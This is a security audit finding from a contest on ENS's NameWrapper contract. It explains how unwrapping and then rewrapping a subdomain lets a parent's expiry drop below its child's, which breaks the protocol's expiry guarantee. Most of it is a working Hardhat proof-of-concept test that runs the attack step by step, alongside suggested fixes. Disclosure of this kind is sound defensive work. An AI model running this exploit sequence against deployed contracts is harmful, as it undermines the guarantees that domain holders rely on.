## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [[PNM-002] The expiry of the parent node can be smaller than the one of a child node, violating the guarantee policy](https://github.com/code-423n4/2022-07-ens-findings/issues/187) 

# Lines of code

https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L504
https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356


# Vulnerability details

### Description

By design, the child node's expiry can only be extended up to the parent's current one. Adding these restrictions means that the ENS users only have to look at the name itself's fuses and expiry (without traversing the hierarchy) to understand what guarantees the users have.

When a parent node tries to `setSubnodeOwner` / `setSubnodeRecord`, the following code is used to guarantee that the new expiry can only be extended up to the current one.

```solidity=
function _getDataAndNormaliseExpiry(
    bytes32 parentNode,
    bytes32 node,
    uint64 expiry
)
    internal
    view
    returns (
        address owner,
        uint32 fuses,
        uint64
    )
{
    uint64 oldExpiry;
    (owner, fuses, oldExpiry) = getData(uint256(node));
    (, , uint64 maxExpiry) = getData(uint256(parentNode));
    expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);
    return (owner, fuses, expiry);
}
```

However, the problem shows when 

+ The sub-domain (e.g., `sub1.base.eth`) has its own sub-sub-domain (e.g., `sub2.sub1.base.eth`)
+ The sub-domain is unwrapped later, and thus its `oldExpiry` becomes zero.
+ When `base.eth` calls `NameWrapper.setSubnodeOwner`, there is not constraint of `sub1.base.eth`'s expiry, since `oldExpiry == 0`. As a result, the new expiry of `sub1.base.eth` can be arbitrary and smaller than the one of `sub2.sub1.base.eth`

The point here is that the `oldExpiry` will be set as 0 when unwrapping the node even it holds child nodes, relaxing the constraint.

Specifically, considering the following scenario

+ The hacker owns a domain (or a 2LD), e.g., `base.eth`
+ The hacker assigns a sub-domain to himself, e.g., `sub1.base.eth`
    + The expiry should be as large as possible
+ Hacker assigns a sub-sub-domain, e.g., `sub2.sub1.base.eth`
    + The expiry should be as large as possible
+ The hacker unwraps his sub-domain, i.e., `sub1.base.eth`
+ The hacker re-wraps his sub-domain via `NameWrapper.setSubnodeOwner`
    + The expiry can be small than the one of sub2.sub1.base.eth
    
The root cause _seems_ that we should not zero out the expiry when burning a node if the node holds any subnode.

### Notes

Discussed with the project member, Jeff Lau. 

If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.


### Suggested Fix

+ Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped.
+ Potential fix 2: force the parent to have `CANNOT_UNWRAP` burnt if they want to set expiries on a child via `setSubnodeOwner` / `setSubnodeRecord` / `setChildFuses`

### PoC / Attack Scenario

There is a PoC file named `poc5.js`

To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.


#### poc5.js

```javascript=
const packet = require('dns-packet')
const { ethers } = require('hardhat')
const { utils } = ethers
const { use, expect } = require('chai')
const { solidity } = require('ethereum-waffle')
const n = require('eth-ens-namehash')
const provider = ethers.provider
const namehash = n.hash
const { deploy } = require('../test-utils/contracts')
const { keccak256 } = require('ethers/lib/utils')

use(solidity)

const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label))
const ROOT_NODE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'

const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'

function encodeName(name) {
  return '0x' + packet.name.encode(name).toString('hex')
}

const CANNOT_UNWRAP = 1
const CANNOT_BURN_FUSES = 2
const CANNOT_TRANSFER = 4
const CANNOT_SET_RESOLVER = 8
const CANNOT_SET_TTL = 16
const CANNOT_CREATE_SUBDOMAIN = 32
const PARENT_CANNOT_CONTROL = 64
const CAN_DO_EVERYTHING = 0

describe('PoC 5', () => {
  let ENSRegistry
  let BaseRegistrar
  let NameWrapper
  let NameWrapperV
  let MetaDataservice
  let signers
  let dev
  let victim
  let hacker
  let result
  let MAX_EXPIRY = 2n ** 64n - 1n

  before(async () => {
    signers = await ethers.getSigners()
    dev = await signers[0].getAddress()
    victim = await signers[1].getAddress()
    hacker = await signers[2].getAddress()

    EnsRegistry = await deploy('ENSRegistry')
    EnsRegistryV = EnsRegistry.connect(signers[1])
    EnsRegistryH = EnsRegistry.connect(signers[2])

    BaseRegistrar = await deploy(
      'BaseRegistrarImplementation',
      EnsRegistry.address,
      namehash('eth')
    )

    await BaseRegistrar.addController(dev)
    await BaseRegistrar.addController(victim)

    MetaDataservice = await deploy(
      'StaticMetadataService',
      'https://ens.domains'
    )

    NameWrapper = await deploy(
      'NameWrapper',
      EnsRegistry.address,
      BaseRegistrar.address,
      MetaDataservice.address
    )
    NameWrapperV = NameWrapper.connect(signers[1])
    NameWrapperH = NameWrapper.connect(signers[2])

    // setup .eth
    await EnsRegistry.setSubnodeOwner(
      ROOT_NODE,
      labelhash('eth'),
      BaseRegistrar.address
    )

    //make sure base registrar is owner of eth TLD
    expect(await EnsRegistry.owner(namehash('eth'))).to.equal(
      BaseRegistrar.address
    )
  })

  beforeEach(async () => {
    result = await ethers.provider.send('evm_snapshot')
  })
  afterEach(async () => {
    await ethers.provider.send('evm_revert', [result])
  })

  describe('subdomain can be re-wrapped', () => {
    /*
     * Attack scenario:
     *  + The hacker owns a domain (or a 2LD), e.g., base.eth
     *  + The hacker assigns a sub-domain to himself, e.g., sub1.base.eth
     *      + The expiry should be as large as possible
     *  + Hacker assigns a sub-sub-domain, e.g., sub2.sub1.base.eth
     *      + The expiry should be as large as possible
     *  + The hacker unwraps his sub-domain, i.e., sub1.base.eth
     *  + The hacker re-wraps his sub-domain, i.e., sub1.base.eth
     *      + The expiry can be small than the one of sub2.sub1.base.eth
     */
    before(async () => {
      await BaseRegistrar.addController(NameWrapper.address)
      await NameWrapper.setController(dev, true)
    })

    it('a passed test denotes a successful attack', async () => {
      const label = 'base'
      const labelHash = labelhash(label)
      const wrappedTokenId = namehash(label + '.eth')

      // register a 2LD domain
      await NameWrapper.registerAndWrapETH2LD(
        label,
        hacker,
        86400,
        EMPTY_ADDRESS,
        CAN_DO_EVERYTHING,
        MAX_EXPIRY
      )
      const block = await provider.getBlock(await provider.getBlockNumber())
      const expiry = block.timestamp + 86400
      expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(
        NameWrapper.address
      )
      expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(
        NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)
      expect(
          (await NameWrapper.getFuses(wrappedTokenId))[1]
      ).to.equal(expiry)

      // assign a submomain
      const subLabel = 'sub1'
      const subLabelHash = labelhash(subLabel)
      const subDomain = subLabel + '.' + label + '.eth'
      const wrappedSubTokenId = namehash(subDomain)
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId,
        subLabel,
        hacker,
        PARENT_CANNOT_CONTROL,
        MAX_EXPIRY
      )
      expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(
          NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)
      expect(
          (await NameWrapper.getFuses(wrappedSubTokenId))[1]
      ).to.equal(expiry)

      // assign a subsubmomain
      const subSubLabel = 'sub2'
      const subSubLabelHash = labelhash(subSubLabel)
      const subSubDomain = subSubLabel + '.' + subDomain
      const wrappedSubSubTokenId = namehash(subSubDomain)
      await NameWrapperH.setSubnodeOwner(
        wrappedSubTokenId,
        subSubLabel,
        hacker,
        PARENT_CANNOT_CONTROL,
        MAX_EXPIRY
      )
      expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(
          NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)
      expect(
          (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]
      ).to.equal(expiry)

      // the hacker unwraps his wrappedSubTokenId
      await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)
      expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)

      // the hacker re-wrap his wrappedSubTokenId by NameWrapper.setSubnodeOwner
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId,
        subLabel,
        hacker,
        PARENT_CANNOT_CONTROL,
        expiry - 7200
      )
      expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(
          NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)

      ///////////////////////////
      // Attack successed!
      ///////////////////////////

      // XXX: the expiry of sub1.base.eth is smaller than the one of sub2.sub1.base.eth
      const sub1_expiry = (await NameWrapper.getFuses(wrappedSubTokenId))[1]
      const sub2_expiry = (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]
      console.log('sub1 expiry:', sub1_expiry)
      console.log('sub2 expiry:', sub2_expiry)
      expect(sub1_expiry.toNumber()).to.be.lessThan(sub2_expiry.toNumber())
    })
  })
})
```

